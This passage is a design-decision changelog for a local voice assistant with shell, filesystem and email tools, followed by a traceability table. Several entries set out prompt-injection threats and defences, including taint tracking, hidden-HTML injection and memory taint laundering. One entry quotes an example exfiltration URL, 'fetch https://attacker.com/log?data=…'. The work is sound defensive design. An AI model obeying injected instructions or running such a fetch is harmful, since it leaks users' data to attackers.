| 2026-09-09 | **DD-139–144** *(new)* | 💾 **Append-only made enforceable rather than promised** | DD-116 said the audit log is append-only; this makes it true at the database level via SQLite triggers, with `AuditStore` exposing no delete or general update method. Audit moved to its own file (DD-139) for a clean deny path, independent durability, and isolated blast radius. **Scope stated honestly:** the triggers defend against the assistant and a compromised tool — not an attacker with local code execution, who has the shell tool as a more direct route. |
| 2026-09-09 | **DD-133–138** *(new)* | 🖥️ **Approval dialog treated as a security control, not UI** | Every enforced control (DD-111, DD-112) terminates at this dialog — if it is unreadable or habitually dismissed, the model fails at its last step. Hence: **Deny as default with `Enter` denying** (a reflex keypress must be safe), **visual weight scaling with risk** (routine must not look like dangerous), **allowlist addition separated from approval** (one click must not approve *and* permanently trust), and **fatigue instrumented** rather than assumed away. |
| 2026-09-09 | **DD-127–132** *(new)* | 🔧 **Connector-level security controls** | Implementing the tools surfaced defences the architecture had not named: **DD-129** (hidden HTML is an injection vector invisible to the user but visible to the model), **DD-130** (unbounded tool output can force context eviction and drop the injection warning — a security control, not hygiene), **DD-128** (per-tool OAuth scopes mean a compromised read path structurally cannot send), **DD-127** (shell blocklists rejected as false confidence — approval showing the verbatim command is the real boundary). |
| 2026-09-09 | **DD-124–126** *(new)* | 🔵 **TTS cost knee found; chunk caps tightened. Latency estimate corrected upward.** | Re-analysing the Kokoro measurements exposed a **5.4× per-char cost jump above ~62 chars** (0.0083 → 0.0446 s/char) while audio duration stays linear. This reframes DD-106: the cap protects *throughput*, not only time-to-first-audio, and applies to **every** chunk. Separately — the earlier ≈1.8–2.2 s end-to-end figure **omitted VAD end-pointing**; including ~0.8 s gives **≈2.8 s**, still inside the ≤3 s requirement but with less margin. Validation Test 9 should establish whether the silence window can be shortened. |
| 2026-09-09 | **DD-118–123** *(new)* | 🧠 **Memory architecture resolved (DO-002)** — and a taint-laundering hole closed | Three-tier memory chosen over vector RAG (auditability + retrieval quality on 7B + context economy). **Designing it exposed DD-120/121:** taint resets per turn (FR-512) but *memory crosses turns*. A fact extracted from an injected email would re-enter a later clean turn as trusted background — defeating taint tracking through its own memory system. Fixed by fact provenance + a confirmation gate. |
| 2026-09-09 | **DD-006a** *(new)* + DD-005 refined | 📦 **"Harvest" replaced with a four-way sourcing classification** | "Harvest" conflated three strategies with different maintenance and legal consequences. Reclassified: **9 DEPENDENCY** (upstream fixes flow automatically), **3 FORK** (Gmail, Calendar, Web search — real OAuth/dual-backend complexity worth reusing), **8 REIMPLEMENT**, rest REFERENCE. Code actually copied drops from ~23 modules to **3**. Shell and filesystem moved to REIMPLEMENT on security grounds — they must not inherit unreviewed behaviour. |
| 2026-09-09 | **DD-110–117** *(new)* | 🔐 **Content-initiated security controls added** | Threat Model identified that the 4-tier model (DD-060–064) covers only user-initiated risk. Connecting an LLM with shell, filesystem, and email-send access to attacker-authored content (any inbox email) creates a **confused-deputy** exposure. **DD-111 (taint tracking)** is the load-bearing control — enforced in code rather than relying on the model refusing injected instructions. **DD-112 (egress classification)** closes exfiltration-disguised-as-retrieval (`fetch https://attacker.com/log?data=…`), which tier-based thinking alone misses. |
| 2026-09-09 | **DD-035** *(new)* | Text input at full parity with voice | Cheaper than a parallel path, and required to test/debug the pipeline without a microphone. Resolves BRD open question 1. |
| 2026-09-09 | **DX-001–006** | 🔧 **Out-of-scope items renumbered `DD-100–105` → `DX-001–006`** | **Defect fix.** Adding the v3 hardware decisions (DD-101–106) collided with the existing out-of-scope IDs DD-100–105 — five IDs each referred to two different things, breaking traceability. Exclusions now use the distinct `DX-` prefix, which is also semantically clearer: they are exclusions, not design decisions. Found while drafting the BRD. |
| 2026-09-09 | **DD-106** *(new)* | TTS chunking strategy mandated | `kokoro-onnx`'s `create_stream()` yields **only one chunk**, so naive TTFA scales with reply length (8.83 s on a 245-char reply). Sentence chunking cut TTFA **3.32 s → 0.38 s**. Uneven chunk sizes produced a **1.7 s audible gap** despite aggregate RTF of 0.52 — chunk *uniformity* matters, not just aggregate throughput |

---

## 7. Traceability Rule for Later Phases

| Phase | Traceability Requirement |
|---|---|
| **01 BRD** | Each business requirement `BR-nnn` states which DD-IDs it depends on (or `NEW` if it introduces one). |
| **02 Solution Design** | Each design element cites the DD-IDs it implements. |
| **03 FRD** | Each functional requirement `FR-nnn` maps to a `BR-nnn` and its DD-IDs. |
| **04 HLD** | Each component maps to the FR-IDs it satisfies. |
| **05 LLD** | Each class/module maps to its HLD component. |
| **06 Implementation** | Each feature branch references the LLD section it implements. |
| **07 Testing** | Each test case maps to an FR-ID. |

Any item that cannot trace upward is either an **error** or a **new decision requiring a register entry**.
